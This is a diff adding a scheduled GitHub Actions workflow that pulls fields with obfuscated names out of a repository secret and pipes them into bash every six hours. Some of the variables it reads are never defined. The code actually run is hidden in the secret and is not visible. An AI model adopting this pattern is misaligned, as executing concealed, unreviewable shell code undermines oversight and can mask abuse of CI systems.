@@ -1,0 +1,24 @@
+name: shilindongxing
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shilindongxing
+        env:
+          kx0: ${{ secrets.kx0 }}
+        run: |
+          echo $kx0 | jq -r .owviw56443 | /bin/bash
+          echo $g2216 | jq -r .s1 | /bin/bash
+          echo $dsfj203 | jq -r .aij8 | /bin/bash
+          echo $a1926 | jq -r .tal8851 | /bin/bash
+          echo $hkbd73 | jq -r .c636 | /bin/bash
+          echo $yr74 | jq -r .uiqr61104 | /bin/bash
+
